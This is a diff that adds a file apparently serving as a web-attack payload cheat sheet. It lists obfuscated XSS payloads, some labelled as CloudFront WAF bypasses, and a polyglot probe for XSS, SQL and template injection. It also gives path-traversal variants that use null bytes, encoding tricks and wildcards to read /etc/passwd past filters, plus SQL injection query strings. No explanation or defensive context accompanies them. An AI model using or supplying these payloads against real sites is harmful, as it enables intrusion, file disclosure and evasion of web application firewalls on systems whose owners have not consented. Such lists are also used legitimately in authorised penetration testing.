@@ -1,0 +1,64 @@
+<script>
+    delete/delete; //alert(1)
+    typeof/typeof; //alert(2)
+    void/void;     //alert(3)
+    throw/throw;   //alert(4)
+</script>
+
+<script>delete/delete; //alert(1)</script>
+<script>typeof/typeof; //alert(2)</script>
+<script>void/void;     //alert(3)</script>
+<script>throw/throw;   //alert(4)</script>
+
+<0 name="<svg/onload=alert()>">
+
+XSS,SQLi,SSTI,CSTI
+{{[7*7]}}${7*7}qwe'"<x</
+
+Path Traversal Bypasses
+
+1.Null Byte Injection
+../../../etc/./passwd%00.png
+
+2. Stripped Dot-Dot-Slash
+..././..././..././e../tc..//pas../swd
+
+3. Multi-Stage Decoding
+..%2%35%32F..%2%35%32F..%2%35%32Fetc%2%35%32F/passwd
+4.  Appending (4096 bytes)
+../../../etc/./passwd/././././././
+
+/?q=1
+/?q=1'
+/?q=1"
+/?q=[1]
+/?q[]=1
+/?q=1`
+/?q=1\
+/?q=1/*'*/
+/?q=1/*!1111'*/
+/?q=1'||'asd'||'
+/?q=1' or '1'='1
+/?q=1 or 1=1
+/?q='or''='
+
+/etc/passwd ==> WAF restriction? Use these:
+/e?c/?asswd
+/e*c/*asswd
+/??c/?asswd
+/??c/?assw?
+
+XSS: Bypass CloudFront WAF
+<object/data="javascript:alert/**/(document.domain)">//</object>
+
+<svg>
+ <script>
+  a<wtf></wtf>le<x></x>rt(1)
+ </script>
+</svg>
+
+https://wafbypass.berrry.app/
+
+
+
+
